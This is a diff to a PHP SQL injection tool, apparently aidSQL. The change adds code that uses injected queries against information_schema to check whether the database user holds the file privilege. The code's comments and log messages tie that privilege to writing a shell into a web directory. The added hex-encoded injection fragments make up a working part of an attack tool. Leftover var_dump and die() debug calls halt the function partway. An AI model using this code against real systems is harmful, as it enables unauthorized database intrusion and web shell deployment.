@@ -446,10 +446,6 @@
 
 			}
 
-			public function getUserPrivileges(){
-			}
-
-
 			/**
 			*Combines URL execution with parsing
 			*/
@@ -521,7 +517,7 @@
 
 			}
 
-			public function isRoot($dbUser=NULL){
+			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){
 
 				if(empty($dbUser)){
 					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
@@ -537,9 +533,39 @@
 					return TRUE;
 				}
 
-				//Check user permissions for writing 
+				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");
 
-				return FALSE;
+				//Check for the file privilege user permissions for writing
+				//What it really takes to get a shell is the file writing privilege
+
+				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
+				return $this->analyzeInjection($filePrivilege);
+
+			}
+
+			public function checkPrivilege($privilege,$user=NULL){
+
+				$privilege			=	\String::hexEncode($privilege);
+				$fieldInjection	=	"is_grantable";
+
+				if(is_null($user)){
+
+					$tableInjection	=	"FROM information_schema.user_privileges ".
+					"WHERE privilege_type=0x66696c65 ".
+					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
+					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";
+
+				}else{
+
+					$user					=	\String::hexEncode($user);
+					$tableInjection	=	"FROM information_schema.user_privileges ".
+					"WHERE privilege_type=0x66696c65 ".
+					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
+					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";
+
+				}
+
+				return $this->generateInjection($fieldInjection,$tableInjection);
 
 			}
 
@@ -552,9 +578,16 @@
 					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\disclosure\\DisclosureResult"));
 				}
 
-				$directories	=	$information->getDirectories();
+				$webDirectories	=	$information->getWebDirectories();
+				$unixDirectories	=	$information->getUnixDirectories();
+				$winDirectories	=	$information->getWindowsDirectories();
 
-				if(!sizeof($directories)){
+				var_dump($unixDirectories);
+				var_dump($winDirectories);
+				die();
+				
+
+				if(!sizeof($webDirectories)){
 
 					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red");
 					continue;
